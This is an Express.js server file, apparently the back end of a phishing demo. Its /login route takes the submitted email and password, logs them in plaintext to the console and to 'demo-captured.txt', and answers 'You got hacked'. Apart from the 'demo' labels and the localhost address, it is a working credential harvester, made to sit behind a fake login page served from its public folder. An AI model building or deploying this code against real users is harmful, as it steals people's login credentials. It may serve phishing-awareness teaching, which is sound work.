const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static("public"));

app.post("/login", (req, res) => {
  const { email, password } = req.body;

  const log = `
=== Demo Captured Data ===
Email/Username: ${email}
Password: ${password}
Time: ${new Date().toLocaleString()}
==========================
`;

  console.log(log);

  fs.appendFileSync("demo-captured.txt", log);

  res.send(`
    <h1>You got hacked 💀</h1>
  `);
});

app.listen(PORT, () => {
  console.log(`Demo running at http://localhost:${PORT}`);
});
